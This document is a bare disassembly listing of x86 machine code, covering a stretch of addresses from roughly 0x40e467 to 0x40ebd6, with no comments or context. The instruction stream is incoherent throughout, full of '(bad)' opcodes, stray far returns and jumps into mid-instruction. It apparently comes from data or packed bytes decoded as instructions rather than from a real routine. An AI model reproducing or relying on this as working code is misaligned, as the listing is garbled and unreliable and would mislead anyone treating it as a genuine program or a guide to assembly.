  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
